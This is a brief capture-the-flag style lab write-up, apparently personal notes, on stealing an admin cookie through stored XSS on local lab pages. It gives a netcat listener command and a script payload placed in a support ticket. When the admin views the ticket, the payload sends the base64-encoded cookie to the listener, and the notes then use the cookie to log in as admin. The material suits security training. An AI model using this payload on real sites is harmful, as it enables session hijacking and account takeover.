Challenge: steal admin cookie.

User interface: http://localhost/labs/x0x03.php
Admin interface: http://localhost/labs/x0x03_admin.php

---

Start a netcat listener to exfiltrate the cookie:
```bash
nc -vnlp 8888
```

As user create a support ticket that sends the base64 encoded cookie to the netcat listener:
`<script>fetch("http://127.0.0.1:8888?cookie=" + btoa(document.cookie))</script>`

When the admin checks the support tickets, the XSS payload is triggered and his cookie is send to our netcat listener:
![[Pasted image 20240326134101.png]]

Base64 decode the cookie:
![[Pasted image 20240326134147.png]]

Now we can use the admin_cookie to login as admin.